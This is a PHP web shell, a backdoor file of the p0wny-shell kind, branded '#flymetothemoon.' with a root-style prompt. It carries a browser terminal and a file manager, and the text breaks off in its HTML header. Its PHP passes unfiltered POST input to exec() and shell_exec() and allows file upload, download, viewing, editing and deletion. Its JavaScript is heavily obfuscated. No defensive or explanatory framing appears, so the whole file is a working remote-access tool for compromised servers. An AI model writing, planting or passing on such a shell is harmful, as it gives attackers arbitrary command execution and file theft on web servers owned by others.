<?php

function featureShell($cmd, $cwd) {
    $stdout = array();

    if (preg_match("/^\s*cd\s*$/", $cmd)) {
        // pass
    } elseif (preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $cmd)) {
        chdir($cwd);
        preg_match("/^\s*cd\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
        chdir($match[1]);
    } elseif (preg_match("/^\s*download\s+[^\s]+\s*(2>&1)?$/", $cmd)) {
        chdir($cwd);
        preg_match("/^\s*download\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
        return featureDownload($match[1]);
    } else {
        chdir($cwd);
        exec($cmd, $stdout);
    }

    return array(
        "stdout" => $stdout,
        "cwd" => getcwd()
    );
}

function featurePwd() {
    return array("cwd" => getcwd());
}

function featureRename($oldPath, $newPath, $cwd) {
    chdir($cwd);

    if (!file_exists($oldPath)) {
        return array(
            "stdout" => array('<span style="color: red;">Source file/folder not found.</span>'),
            "cwd" => getcwd()
        );
    }

    // If the new path already exists, optionally return an error or overwrite. 
    // For safety, let's just block the rename if the destination exists:
    if (file_exists($newPath)) {
        return array(
            "stdout" => array('<span style="color: red;">A file/folder with that new name already exists.</span>'),
            "cwd" => getcwd()
        );
    }

    // Try to rename:
    if (!@rename($oldPath, $newPath)) {
        return array(
            "stdout" => array('<span style="color: red;">Failed to rename.</span>'),
            "cwd" => getcwd()
        );
    }

    return array(
        "stdout" => array('<span style="color: #5a82a6;">Rename successful.</span>'),
        "cwd" => getcwd()
    );
}

function featureHint($fileName, $cwd, $type) {
    chdir($cwd);
    if ($type == 'cmd') {
        $cmd = "compgen -c $fileName";
    } else {
        $cmd = "compgen -f $fileName";
    }
    $cmd = "/bin/bash -c \"$cmd\"";
    $files = explode("\n", shell_exec($cmd));
    return array(
        'files' => $files,
    );
}

function featureDownload($filePath) {
    $file = @file_get_contents($filePath);
    if ($file === FALSE) {
        return array(
            'stdout' => array('<span style="color: red;">File not found / no read permission.</span>'),
            'cwd' => getcwd()
        );
    } else {
        return array(
            'name' => basename($filePath),
            'file' => base64_encode($file)
        );
    }
}

function featureUpload($path, $file, $cwd) {
    chdir($cwd);
    // Use basename() to avoid directory traversal and use only the file's base name.
    $safePath = basename($path);
    $f = @fopen($safePath, 'wb');
    if ($f === FALSE) {
        return array(
            'stdout' => array('<span style="color: red;">Invalid path / no write permission.</span>'),
            'cwd' => getcwd()
        );
    } else {
        fwrite($f, base64_decode($file));
        fclose($f);
        return array(
            'stdout' => array('<span style="color: #5a82a6;">Upload successful.</span>'),
            'cwd' => getcwd()
        );
    }
}

// New: change directory function using a dedicated endpoint.
function featureCd($dir, $cwd) {
    chdir($cwd);
    if(is_dir($dir)) {
        chdir($dir);
        return array(
            "stdout" => array(''),
            "cwd" => getcwd()
        );
    } else {
        return array(
            "stdout" => array(''),
            "cwd" => getcwd()
        );
    }
}

// List files: directories first, then files
function featureList($cwd) {
    chdir($cwd);
    $files = scandir(getcwd());
    $files = array_values(array_filter($files, function($f) { return $f !== '.' && $f !== '..'; }));
    $result = array();

    foreach ($files as $file) {
        $fullPath = getcwd() . DIRECTORY_SEPARATOR . $file;

        // Grab octal permissions, e.g. 0644 => "0644"
        $permission = substr(sprintf('%o', fileperms($fullPath)), -4);

        $result[] = array(
            "name"     => $file,
            "is_dir"   => is_dir($fullPath),
            "size"     => is_file($fullPath) ? filesize($fullPath) : null,
            "modified" => filemtime($fullPath),
            "perm"     => $permission
        );
    }

    usort($result, function($a, $b) {
        if ($a["is_dir"] == $b["is_dir"]) {
            return strcasecmp($a["name"], $b["name"]);
        }
        return ($a["is_dir"] ? -1 : 1);
    });
    return array("files" => $result, "cwd" => getcwd());
}

function featureView($filePath, $cwd) {
    chdir($cwd);
    if (!file_exists($filePath)) {
         return array("stdout" => array('<span style="color: red;">File not found.</span>'), "cwd" => getcwd());
    }
    $content = @file_get_contents($filePath);
    if ($content === FALSE) {
         return array("stdout" => array('<span style="color: red;">Failed to read file.</span>'), "cwd" => getcwd());
    }
    return array("content" => $content, "cwd" => getcwd());
}

function featureEdit($filePath, $newContent, $cwd) {
    chdir($cwd);
    if (!file_exists($filePath)) {
         return array("stdout" => array('<span style="color: red;">File not found.</span>'), "cwd" => getcwd());
    }
    if (!is_writable($filePath)) {
         return array("stdout" => array('<span style="color: red;">File is not writable.</span>'), "cwd" => getcwd());
    }
    // Remove extra escaping.
    $newContent = stripslashes($newContent);
    $result = file_put_contents($filePath, $newContent);
    if ($result === FALSE) {
         return array("stdout" => array('<span style="color: red;">Failed to write file.</span>'), "cwd" => getcwd());
    }
    return array("stdout" => array('<span style="color: #5a82a6;">Edit successful.</span>'), "cwd" => getcwd());
}

function featureDelete($filePath, $cwd) {
    chdir($cwd);
    if (!file_exists($filePath)) {
         return array("stdout" => array('<span style="color: red;">File not found.</span>'), "cwd" => getcwd());
    }
    if (is_dir($filePath)) {
         $contents = scandir($filePath);
         if (count($contents) > 2) {
             return array("stdout" => array('<span style="color: red;">Directory is not empty.</span>'), "cwd" => getcwd());
         }
         if (rmdir($filePath)) {
              return array("stdout" => array('<span style="color: #5a82a6;">Directory deleted.</span>'), "cwd" => getcwd());
         } else {
              return array("stdout" => array('<span style="color: red;">Failed to delete directory.</span>'), "cwd" => getcwd());
         }
    } else {
         if (unlink($filePath)) {
              return array("stdout" => array('<span style="color: #5a82a6;">File deleted.</span>'), "cwd" => getcwd());
         } else {
              return array("stdout" => array('<span style="color: red;">Failed to delete file.</span>'), "cwd" => getcwd());
         }
    }
}

if (isset($_GET["feature"])) {

    $response = NULL;

    switch ($_GET["feature"]) {
        case "shell":
            $cmd = $_POST['cmd'];
            if (!preg_match('/2>/', $cmd)) {
                $cmd .= ' 2>&1';
            }
            $response = featureShell($cmd, $_POST["cwd"]);
            break;
        case "pwd":
            $response = featurePwd();
            break;
        case "hint":
            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);
            break;
        case "upload":
            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);
            break;
        case "cd":
            $response = featureCd($_POST['dir'], $_POST['cwd']);
            break;
        case "list":
            $response = featureList($_POST['cwd']);
            break;
        case "view":
            $response = featureView($_POST['file'], $_POST['cwd']);
            break;
        case "edit":
            $response = featureEdit($_POST['file'], $_POST['content'], $_POST['cwd']);
            break;
        case "delete":
            $response = featureDelete($_POST['file'], $_POST['cwd']);
            break;
        case "rename":
            $response = featureRename($_POST['old'], $_POST['new'], $_POST['cwd']);
            break;
    }

    header("Content-Type: application/json");
    echo json_encode($response);
    die();
}

?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8" />
        <title>#flymetothemoon.</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <style>
            html, body {
                margin: 0;
                padding: 0;
                background: #333;
                color: #eee;
                font-family: monospace;
            }
            *::-webkit-scrollbar-track {
                border-radius: 8px;
                background-color: #353535;
            }
            *::-webkit-scrollbar {
                width: 8px;
                height: 8px;
            }
            *::-webkit-scrollbar-thumb {
                border-radius: 8px;
                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);
                background-color: #bcbcbc;
            }

            /* Top container for the shell */
            #shell {
                background: #141414;
                max-width: 1000px;
                margin: 30px auto;
                box-shadow: 0 0 5px rgba(0, 0, 0, .3);
                font-size: 10pt;
                display: flex;
                flex-direction: column;
                border: 1px solid #444;
            }
            #shell-logo {
                font-weight: bold;
                color: #5a82a6;
                text-align: center;
                padding: 10px;
            }
            #shell-content {
                height: 300px;
                overflow: auto;
                padding: 5px;
                white-space: pre-wrap;
                flex-grow: 1;
            }
            #shell-input {
                display: flex;
                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);
                border-top: rgba(255, 255, 255, .05) solid 1px;
                padding: 5px;
            }
            #shell-input > label {
                flex-grow: 0;
                display: block;
                padding: 0 5px;
                height: 30px;
                line-height: 30px;
            }
            #shell-input #shell-cmd {
                height: 30px;
                line-height: 30px;
                border: none;
                background: transparent;
                color: #5a82a6;
                font-family: monospace;
                font-size: 10pt;
                width: 100%;
                outline: none;
            }

            /* Edit container placed below command prompt */
            #edit-container {
                display: none;
                background: #222;
                padding: 10px;
                border-top: 1px solid #444;
            }
            #edit-container textarea {
                width: 100%;
                height: 150px;
                background: #333;
                color: #eee;
                font-family: monospace;
                font-size: 10pt;
                border: 1px solid #555;
                padding: 5px;
            }
            #edit-container .btn {
                padding: 5px 10px;
                margin-top: 5px;
                background: #444;
                color: #eee;
                border: none;
                cursor: pointer;
            }
            #edit-container .btn:hover {
                background: #555;
            }

            /* File manager below edit container */
            #filemanager {
                background: #1a1a1a;
                padding: 10px;
                border-top: 1px solid #444;
            }
            #breadcrumbs {
                margin-bottom: 10px;
            }
            #breadcrumbs a {
                color: #5a82a6;
                text-decoration: none;
                cursor: pointer;
            }
            #breadcrumbs a:hover {
                text-decoration: underline;
            }

            /* Table layout for files/folders */
            #file-list-table {
                width: 100%;
                border-collapse: collapse;
            }
            #file-list-table th, #file-list-table td {
                border: 1px solid #444;
                padding: 6px 10px;
            }
            #file-list-table th {
                background: #333;
                color: #fff;
                text-align: left;
            }
            #file-list-table td {
                background: #222;
                vertical-align: middle;
            }

            /* Buttons in Actions column */
            .action-btn {
                margin-right: 5px;
                padding: 3px 8px;
                background: #444;
                color: #eee;
                border: none;
                cursor: pointer;
            }
            .action-btn:hover {
                background: #555;
            }

            /* Distinguish folder vs file in name column */
            .folder {
                color: #5a82a6;
                cursor: pointer;
            }
            .file {
                color:#fff;
            }

            /* Upload button at top of file manager */
            #upload-btn {
                margin-bottom: 10px;
                padding: 5px 10px;
                background: #444;
                color: #eee;
                border: none;
                cursor: pointer;
            }
            #upload-btn:hover {
                background: #555;
            }
        </style>
        <script>
var _0x1c980a=_0x3009;(function(_0x39b1f2,_0x2bd3a6){var _0x4eb136=_0x3009,_0x1a0c7f=_0x39b1f2();while(!![]){try{var _0x4b08a1=-parseInt(_0x4eb136(0x116))/0x1+-parseInt(_0x4eb136(0x105))/0x2*(-parseInt(_0x4eb136(0xe9))/0x3)+-parseInt(_0x4eb136(0x10a))/0x4*(-parseInt(_0x4eb136(0xd4))/0x5)+-parseInt(_0x4eb136(0xe8))/0x6*(parseInt(_0x4eb136(0xc2))/0x7)+-parseInt(_0x4eb136(0xd0))/0x8*(parseInt(_0x4eb136(0xf3))/0x9)+-parseInt(_0x4eb136(0x11d))/0xa+parseInt(_0x4eb136(0xed))/0xb;if(_0x4b08a1===_0x2bd3a6)break;else _0x1a0c7f['push'](_0x1a0c7f['shift']());}catch(_0x437250){_0x1a0c7f['push'](_0x1a0c7f['shift']());}}}(_0x4307,0x33a5f));var CWD=null,commandHistory=[],historyPosition=0x0,eShellCmdInput=null,eShellContent=null,currentEditFile=null;function _insertCommand(_0x35ce87){var _0x1b64a8=_0x3009;eShellContent[_0x1b64a8(0x11e)]+='\x0a\x0a',eShellContent['innerHTML']+=_0x1b64a8(0xd9)+genPrompt(CWD)+_0x1b64a8(0xba)+escapeHtml(_0x35ce87)+'\x0a',eShellContent[_0x1b64a8(0x11f)]=eShellContent[_0x1b64a8(0xf2)];}function _insertStdout(_0x27ec82){var _0x526ea3=_0x3009;eShellContent[_0x526ea3(0x11e)]+=_0x27ec82+'\x0a',eShellContent[_0x526ea3(0x11f)]=eShellContent[_0x526ea3(0xf2)];}function _defer(_0x3c7ad1){setTimeout(_0x3c7ad1,0x0);}function featureShell(_0x22c6e3){var _0x81bd67=_0x3009;_insertCommand(_0x22c6e3);if(/^\s*upload\s+[^\s]+\s*$/[_0x81bd67(0xe7)](_0x22c6e3))featureUpload(_0x22c6e3[_0x81bd67(0x11a)](/^\s*upload\s+([^\s]+)\s*$/)[0x1]);else/^\s*clear\s*$/['test'](_0x22c6e3)?eShellContent[_0x81bd67(0x11e)]='':makeRequest(_0x81bd67(0xcf),{'cmd':_0x22c6e3,'cwd':CWD},function(_0x348e0a){var _0x40f7a4=_0x81bd67;_0x348e0a[_0x40f7a4(0xc6)](_0x40f7a4(0xbc))?featureDownload(_0x348e0a[_0x40f7a4(0xec)],_0x348e0a['file']):(_insertStdout(_0x348e0a[_0x40f7a4(0xcb)][_0x40f7a4(0x10b)]('\x0a')),updateCwd(_0x348e0a['cwd']));});}function featureHint(){var _0x469431=_0x3009;if(eShellCmdInput[_0x469431(0xee)][_0x469431(0x121)]()['length']===0x0)return;function _0x1b812a(_0x1bb41b){var _0x2cd854=_0x469431;if(_0x1bb41b['files'][_0x2cd854(0xe3)]<=0x1)return;if(_0x1bb41b[_0x2cd854(0x108)][_0x2cd854(0xe3)]===0x2){if(_0x7d5ce0===_0x2cd854(0xd1))eShellCmdInput[_0x2cd854(0xee)]=_0x1bb41b[_0x2cd854(0x108)][0x0];else{var _0x724ab0=eShellCmdInput[_0x2cd854(0xee)];eShellCmdInput['value']=_0x724ab0[_0x2cd854(0xe2)](/([^\s]*)$/,_0x1bb41b[_0x2cd854(0x108)][0x0]);}}else _insertCommand(eShellCmdInput[_0x2cd854(0xee)]),_insertStdout(_0x1bb41b[_0x2cd854(0x108)]['join']('\x0a'));}var _0x2044c1=eShellCmdInput['value'][_0x469431(0x119)]('\x20'),_0x7d5ce0=_0x2044c1[_0x469431(0xe3)]===0x1?_0x469431(0xd1):_0x469431(0xbc),_0x319231=_0x7d5ce0===_0x469431(0xd1)?_0x2044c1[0x0]:_0x2044c1[_0x2044c1[_0x469431(0xe3)]-0x1];makeRequest(_0x469431(0xb1),{'filename':_0x319231,'cwd':CWD,'type':_0x7d5ce0},_0x1b812a);}function featureDownload(_0x116d7a,_0x4c21c8){var _0x36b9fb=_0x3009,_0x357a61=document[_0x36b9fb(0x117)]('a');_0x357a61[_0x36b9fb(0xd2)]('href',_0x36b9fb(0xc7)+_0x4c21c8),_0x357a61['setAttribute']('download',_0x116d7a),_0x357a61['style'][_0x36b9fb(0xfb)]=_0x36b9fb(0xfd),document[_0x36b9fb(0xf6)][_0x36b9fb(0xe0)](_0x357a61),_0x357a61[_0x36b9fb(0xe1)](),document[_0x36b9fb(0xf6)][_0x36b9fb(0xf9)](_0x357a61),_insertStdout('Done.');}function featureUpload(_0x2c3f16){var _0x602017=_0x3009,_0x24db4d=document[_0x602017(0x117)]('input');_0x24db4d[_0x602017(0xd2)](_0x602017(0xf1),_0x602017(0xbc)),_0x24db4d[_0x602017(0x10f)][_0x602017(0xfb)]='none',document[_0x602017(0xf6)][_0x602017(0xe0)](_0x24db4d),_0x24db4d[_0x602017(0x113)](_0x602017(0x115),function(){var _0x29777c=_0x602017,_0x1867a4=getBase64(_0x24db4d[_0x29777c(0x108)][0x0]);_0x1867a4[_0x29777c(0xb5)](function(_0x22ff09){var _0x467f22=_0x29777c;makeRequest(_0x467f22(0xfe),{'path':_0x2c3f16,'file':_0x22ff09,'cwd':CWD},function(_0x4e1f6d){var _0x177831=_0x467f22;_insertStdout(_0x4e1f6d[_0x177831(0xcb)][_0x177831(0x10b)]('\x0a')),updateCwd(_0x4e1f6d[_0x177831(0x104)]),fetchFileList();});},function(){var _0x56c012=_0x29777c;_insertStdout(_0x56c012(0xc4));});}),_0x24db4d[_0x602017(0xe1)](),document['body']['removeChild'](_0x24db4d);}function fileManagerUpload(){var _0x3a3689=_0x3009,_0x4271e=document[_0x3a3689(0x117)](_0x3a3689(0xc9));_0x4271e[_0x3a3689(0xf1)]=_0x3a3689(0xbc),_0x4271e[_0x3a3689(0x10f)]['display']='none',document['body'][_0x3a3689(0xe0)](_0x4271e),_0x4271e[_0x3a3689(0x113)](_0x3a3689(0x115),function(){var _0x112ded=_0x3a3689,_0x5b1ef5=_0x4271e[_0x112ded(0x108)][0x0];getBase64(_0x5b1ef5)['then'](function(_0x1959d4){var _0x589e27=_0x112ded,_0x4b1fa6=CWD+'/'+_0x5b1ef5[_0x589e27(0xec)];makeRequest(_0x589e27(0xfe),{'path':_0x4b1fa6,'file':_0x1959d4,'cwd':CWD},function(_0x8a46ef){var _0x33dfc1=_0x589e27;_insertStdout(_0x8a46ef[_0x33dfc1(0xcb)][_0x33dfc1(0x10b)]('\x0a')),fetchFileList();});}),document[_0x112ded(0xf6)][_0x112ded(0xf9)](_0x4271e);}),_0x4271e[_0x3a3689(0xe1)]();}function getBase64(_0x303737){return new Promise(function(_0x1bf1f6,_0x16273d){var _0x5084b2=_0x3009,_0x1e950b=new FileReader();_0x1e950b[_0x5084b2(0xff)]=function(){var _0x371947=_0x5084b2,_0x2bb7dc=_0x1e950b[_0x371947(0xe4)][_0x371947(0x11a)](/base64,(.*)$/);_0x2bb7dc?_0x1bf1f6(_0x2bb7dc[0x1]):_0x16273d(_0x371947(0x10e));},_0x1e950b[_0x5084b2(0xb9)]=_0x16273d,_0x1e950b[_0x5084b2(0xbd)](_0x303737);});}function _0x3009(_0x55e1e5,_0x45ff62){var _0x43072d=_0x4307();return _0x3009=function(_0x300995,_0x565dd6){_0x300995=_0x300995-0xb0;var _0x127edc=_0x43072d[_0x300995];return _0x127edc;},_0x3009(_0x55e1e5,_0x45ff62);}function genPrompt(_0x55c879){var _0x247459=_0x3009;_0x55c879=_0x55c879||'~';var _0x2f025b=_0x55c879;if(_0x55c879['split']('/')[_0x247459(0xe3)]>0x3){var _0x585db2=_0x55c879[_0x247459(0x119)]('/');_0x2f025b='…/'+_0x585db2[_0x585db2[_0x247459(0xe3)]-0x2]+'/'+_0x585db2[_0x585db2[_0x247459(0xe3)]-0x1];}return _0x247459(0xb7)+_0x55c879+'\x22>'+_0x2f025b+_0x247459(0xfa);}function updateCwd(_0x46b6f4){var _0x36fa93=_0x3009;if(_0x46b6f4){CWD=_0x46b6f4,_updatePrompt(),fetchFileList();return;}makeRequest(_0x36fa93(0x100),{},function(_0x89e0b6){var _0x5170fb=_0x36fa93;CWD=_0x89e0b6[_0x5170fb(0x104)],_updatePrompt(),fetchFileList();});}function _updatePrompt(){var _0x4dc497=_0x3009,_0x517f5b=document[_0x4dc497(0x11c)](_0x4dc497(0xd3));_0x517f5b[_0x4dc497(0x11e)]=genPrompt(CWD);}function _onShellCmdKeyDown(_0x36fcda){var _0x954b4b=_0x3009;switch(_0x36fcda[_0x954b4b(0xdd)]){case _0x954b4b(0xdf):featureShell(eShellCmdInput[_0x954b4b(0xee)]),insertToHistory(eShellCmdInput[_0x954b4b(0xee)]),eShellCmdInput[_0x954b4b(0xee)]='';break;case _0x954b4b(0x103):historyPosition>0x0&&(historyPosition--,eShellCmdInput[_0x954b4b(0x10c)](),eShellCmdInput[_0x954b4b(0xee)]=commandHistory[historyPosition],_defer(function(){var _0xa01229=_0x954b4b;eShellCmdInput[_0xa01229(0xb4)]();}));break;case _0x954b4b(0xf0):if(historyPosition>=commandHistory[_0x954b4b(0xe3)])break;historyPosition++;historyPosition===commandHistory[_0x954b4b(0xe3)]?eShellCmdInput[_0x954b4b(0xee)]='':(eShellCmdInput[_0x954b4b(0x10c)](),eShellCmdInput[_0x954b4b(0xb4)](),eShellCmdInput['value']=commandHistory[historyPosition]);break;case _0x954b4b(0xbf):_0x36fcda['preventDefault'](),featureHint();break;}}function insertToHistory(_0x46e3dd){var _0x475251=_0x3009;commandHistory['push'](_0x46e3dd),historyPosition=commandHistory[_0x475251(0xe3)];}function makeRequest(_0x940bdd,_0x23eded,_0x5f2b94){var _0x5b8b96=_0x3009;function _0x50a3e0(){var _0x10c285=_0x3009,_0x1562a8=[];for(var _0x55b703 in _0x23eded){_0x23eded[_0x10c285(0xc6)](_0x55b703)&&_0x1562a8[_0x10c285(0x102)](encodeURIComponent(_0x55b703)+'='+encodeURIComponent(_0x23eded[_0x55b703]));}return _0x1562a8[_0x10c285(0x10b)]('&');}var _0x3e3995=new XMLHttpRequest();_0x3e3995[_0x5b8b96(0x118)](_0x5b8b96(0xd8),_0x940bdd,!![]),_0x3e3995[_0x5b8b96(0xeb)](_0x5b8b96(0xda),_0x5b8b96(0xca)),_0x3e3995[_0x5b8b96(0x107)]=function(){var _0x2233dd=_0x5b8b96;if(_0x3e3995[_0x2233dd(0xf8)]===0x4&&_0x3e3995[_0x2233dd(0xc5)]===0xc8)try{var _0x3dc8dc=JSON['parse'](_0x3e3995['responseText']);_0x5f2b94(_0x3dc8dc);}catch(_0x5aa433){alert(_0x2233dd(0xc0)+_0x5aa433);}},_0x3e3995[_0x5b8b96(0x122)](_0x50a3e0());}function fetchFileList(){var _0xd37b99=_0x3009;makeRequest(_0xd37b99(0xf4),{'cwd':CWD},function(_0x2c483f){var _0x9d9bf8=_0xd37b99,_0x4d59e4=document[_0x9d9bf8(0x11c)]('file-list');_0x4d59e4[_0x9d9bf8(0x11e)]='',_0x2c483f[_0x9d9bf8(0x108)]['forEach'](function(_0x4fcfe0){var _0x47d3da=_0x9d9bf8,_0x5b3a94=document[_0x47d3da(0x117)]('tr'),_0x3633be=document[_0x47d3da(0x117)]('td');_0x4fcfe0[_0x47d3da(0x111)]?_0x3633be[_0x47d3da(0x11e)]=_0x47d3da(0xb6)+encodeURIComponent(_0x4fcfe0['name'])+_0x47d3da(0xbb)+escapeHtml(_0x4fcfe0[_0x47d3da(0xec)])+_0x47d3da(0xdc):_0x3633be[_0x47d3da(0x11e)]=_0x47d3da(0x112)+escapeHtml(_0x4fcfe0[_0x47d3da(0xec)])+_0x47d3da(0xdc);_0x5b3a94[_0x47d3da(0xe0)](_0x3633be);var _0x576a77=document['createElement']('td');_0x576a77['textContent']=_0x4fcfe0[_0x47d3da(0xea)]||'',_0x5b3a94['appendChild'](_0x576a77);var _0x726ed7=document[_0x47d3da(0x117)]('td');_0x726ed7[_0x47d3da(0xef)]=_0x4fcfe0['size']!==null?_0x4fcfe0[_0x47d3da(0xc1)]+_0x47d3da(0xe6):'',_0x5b3a94[_0x47d3da(0xe0)](_0x726ed7);var _0x3a1ece=document[_0x47d3da(0x117)]('td');if(_0x4fcfe0[_0x47d3da(0xce)]){var _0x1e9e0c=new Date(_0x4fcfe0[_0x47d3da(0xce)]*0x3e8);_0x3a1ece[_0x47d3da(0xef)]=_0x1e9e0c['toLocaleString']();}else _0x3a1ece[_0x47d3da(0xef)]='';_0x5b3a94[_0x47d3da(0xe0)](_0x3a1ece);var _0x2076b3=document[_0x47d3da(0x117)]('td');if(!_0x4fcfe0['is_dir']){var _0x16be88=document[_0x47d3da(0x117)](_0x47d3da(0x120));_0x16be88[_0x47d3da(0xb0)]=_0x47d3da(0xc3),_0x16be88[_0x47d3da(0xef)]=_0x47d3da(0xd7),_0x16be88[_0x47d3da(0x101)]=function(){var _0x12cd33=_0x47d3da;editFile(_0x4fcfe0[_0x12cd33(0xec)]);},_0x2076b3[_0x47d3da(0xe0)](_0x16be88);}var _0x2a73a4=document[_0x47d3da(0x117)]('button');_0x2a73a4[_0x47d3da(0xb0)]=_0x47d3da(0xc3),_0x2a73a4[_0x47d3da(0xef)]=_0x47d3da(0xde),_0x2a73a4['onclick']=function(){renameFile(_0x4fcfe0['name']);},_0x2076b3['appendChild'](_0x2a73a4);var _0x7124bb=document[_0x47d3da(0x117)](_0x47d3da(0x120));_0x7124bb['className']=_0x47d3da(0xc3),_0x7124bb[_0x47d3da(0xef)]='Delete',_0x7124bb[_0x47d3da(0x101)]=function(){var _0x2dc76e=_0x47d3da;deleteFile(_0x4fcfe0[_0x2dc76e(0xec)]);},_0x2076b3[_0x47d3da(0xe0)](_0x7124bb),_0x5b3a94[_0x47d3da(0xe0)](_0x2076b3),_0x4d59e4[_0x47d3da(0xe0)](_0x5b3a94);}),updateBreadcrumbs();});}function updateBreadcrumbs(){var _0x319436=_0x3009,_0x516fbe=document[_0x319436(0x11c)](_0x319436(0xc8)),_0x4cb80e=CWD[_0x319436(0xe2)](/\\/g,'/'),_0x3dc376=_0x4cb80e['split']('/'),_0x2ccf8d='',_0xe22a9d='';for(var _0x5311b8=0x0;_0x5311b8<_0x3dc376['length'];_0x5311b8++){_0x5311b8===0x0?(_0x2ccf8d=_0x3dc376[_0x5311b8],_0xe22a9d+=_0x319436(0xb8)+_0x2ccf8d+_0x319436(0xcc)+escapeHtml(_0x3dc376[_0x5311b8])+_0x319436(0xe5)):(_0x2ccf8d+='/'+_0x3dc376[_0x5311b8],_0xe22a9d+=_0x319436(0x110)+_0x2ccf8d+_0x319436(0xcc)+escapeHtml(_0x3dc376[_0x5311b8])+_0x319436(0xe5));}_0x516fbe[_0x319436(0x11e)]=_0xe22a9d;}function changeDirectory(_0x1db13f){makeRequest('?feature=cd',{'dir':decodeURIComponent(_0x1db13f),'cwd':CWD},function(_0x370405){var _0x290247=_0x3009;_insertStdout(_0x370405[_0x290247(0xcb)][_0x290247(0x10b)]('\x0a')),updateCwd(_0x370405[_0x290247(0x104)]);});}function _0x4307(){var _0x47ed58=['action-btn','An\x20unknown\x20client-side\x20error\x20occurred.','status','hasOwnProperty','data:application/octet-stream;base64,','breadcrumbs','input','application/x-www-form-urlencoded','stdout','\x27);\x20return\x20false;\x22>','?feature=view','modified','?feature=shell','152StiiPK','cmd','setAttribute','shell-prompt','7595aeQaKu','?feature=rename','edit-container','Edit','POST','<span\x20class=\x22shell-prompt\x22>','Content-Type','?feature=delete','</span>','key','Rename','Enter','appendChild','click','replace','length','result','</a>','\x20bytes','test','6zIbNbi','1101732DWWtPD','perm','setRequestHeader','name','4598033HSGswx','value','textContent','ArrowDown','type','scrollHeight','10926vEFXCV','?feature=list','shell-content','body','content','readyState','removeChild','</span>#','display','Could\x20not\x20retrieve\x20file\x20content.','none','?feature=upload','onload','?feature=pwd','onclick','push','ArrowUp','cwd','2pzrBgy','block','onreadystatechange','files','edit-textarea','516qVVHoB','join','blur','Enter\x20new\x20name\x20for:\x20','No\x20base64\x20result\x20found.','style','\x20/\x20<a\x20href=\x22#\x22\x20onclick=\x22changeDirectory(\x27','is_dir','<span\x20class=\x22file\x22>','addEventListener','edit-filename','change','391768vTvjPR','createElement','open','split','match','&lt;','getElementById','3083990TGChrG','innerHTML','scrollTop','button','trim','send','className','?feature=hint','&amp;','upload-btn','focus','then','<span\x20class=\x22folder\x22\x20onclick=\x22changeDirectory(\x27','root@ReiAyanami:~$<span\x20title=\x22','<a\x20href=\x22#\x22\x20onclick=\x22changeDirectory(\x27','onerror','</span>\x20','\x27)\x22>','file','readAsDataURL','?feature=edit','Tab','Error\x20while\x20parsing\x20response:\x20','size','324898UfkPzZ'];_0x4307=function(){return _0x47ed58;};return _0x4307();}function editFile(_0xdbe528){var _0x17a4ed=_0x3009;makeRequest(_0x17a4ed(0xcd),{'file':decodeURIComponent(_0xdbe528),'cwd':CWD},function(_0x2fa886){var _0x56acca=_0x17a4ed;_0x2fa886['hasOwnProperty']('content')?showEditContainer(decodeURIComponent(_0xdbe528),_0x2fa886[_0x56acca(0xf7)]):_insertStdout(_0x56acca(0xfc));});}function deleteFile(_0x11261b){var _0x4ad684=_0x3009;confirm('Are\x20you\x20sure\x20you\x20want\x20to\x20delete\x20'+decodeURIComponent(_0x11261b)+'?')&&makeRequest(_0x4ad684(0xdb),{'file':decodeURIComponent(_0x11261b),'cwd':CWD},function(_0x488fdb){var _0x4676df=_0x4ad684;_insertStdout(_0x488fdb[_0x4676df(0xcb)][_0x4676df(0x10b)]('\x0a')),fetchFileList();});}function renameFile(_0x416031){var _0x506751=_0x3009,_0x511560=prompt(_0x506751(0x10d)+_0x416031);if(!_0x511560)return;makeRequest(_0x506751(0xd5),{'old':decodeURIComponent(_0x416031),'new':decodeURIComponent(_0x511560),'cwd':CWD},function(_0x7fe6d0){var _0xc8bcdd=_0x506751;_insertStdout(_0x7fe6d0['stdout'][_0xc8bcdd(0x10b)]('\x0a')),fetchFileList();});}function showEditContainer(_0x217c8b,_0x2557e8){var _0x5746a6=_0x3009;currentEditFile=_0x217c8b,document[_0x5746a6(0x11c)](_0x5746a6(0x114))['innerText']=_0x217c8b,document[_0x5746a6(0x11c)](_0x5746a6(0x109))['value']=_0x2557e8,document['getElementById'](_0x5746a6(0xd6))['style']['display']=_0x5746a6(0x106);}function cancelEditFile(){var _0x3a26a7=_0x3009;currentEditFile=null,document[_0x3a26a7(0x11c)](_0x3a26a7(0xd6))[_0x3a26a7(0x10f)][_0x3a26a7(0xfb)]=_0x3a26a7(0xfd);}function saveEditFile(){var _0x5c49bc=_0x3009,_0xd3c2ea=document['getElementById'](_0x5c49bc(0x109))[_0x5c49bc(0xee)];currentEditFile&&makeRequest(_0x5c49bc(0xbe),{'file':currentEditFile,'content':_0xd3c2ea,'cwd':CWD},function(_0x3eaf5e){var _0x49705a=_0x5c49bc;_insertStdout(_0x3eaf5e[_0x49705a(0xcb)][_0x49705a(0x10b)]('\x0a')),cancelEditFile(),fetchFileList();});}function escapeHtml(_0x184b0b){var _0x1c76bb=_0x3009;return _0x184b0b['replace'](/&/g,_0x1c76bb(0xb2))[_0x1c76bb(0xe2)](/</g,_0x1c76bb(0x11b))[_0x1c76bb(0xe2)](/>/g,'&gt;');}window[_0x1c980a(0xff)]=function(){var _0x282c5b=_0x1c980a;eShellCmdInput=document[_0x282c5b(0x11c)]('shell-cmd'),eShellContent=document[_0x282c5b(0x11c)](_0x282c5b(0xf5)),updateCwd(),eShellCmdInput[_0x282c5b(0xb4)](),document[_0x282c5b(0x11c)](_0x282c5b(0xb3))['addEventListener']('click',fileManagerUpload);};
        </script>
    </head>
    <body>
        <div id="shell">
            <pre id="shell-content">
<div id="shell-logo">

██████╗ ███████╗██╗              ███████╗██╗   ██╗ █████╗      ██████╗  ██████╗ 
██╔══██╗██╔════╝██║              ██╔════╝██║   ██║██╔══██╗    ██╔═████╗██╔═████╗
██████╔╝█████╗  ██║    █████╗    █████╗  ██║   ██║███████║    ██║██╔██║██║██╔██║
